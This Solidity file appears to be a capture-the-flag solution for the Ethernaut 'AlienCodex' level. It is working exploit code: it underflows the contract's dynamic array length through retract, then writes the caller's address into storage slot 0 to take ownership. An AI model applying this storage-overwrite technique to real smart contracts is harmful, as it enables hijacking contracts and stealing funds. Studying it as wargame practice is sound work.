// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import "../instances/Ilevel19.sol";

contract AlienHack {
    AlienCodex level19 = AlienCodex(0x64960fB387b8116143be37Fc316BfBF2566eF83f);

    function exploit() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        level19.make_contact(); //make contact to pass modifiers
        level19.retract(); //cause underflow - now array should take over contract storage
        level19.revise(index, myAddress);
    }
}
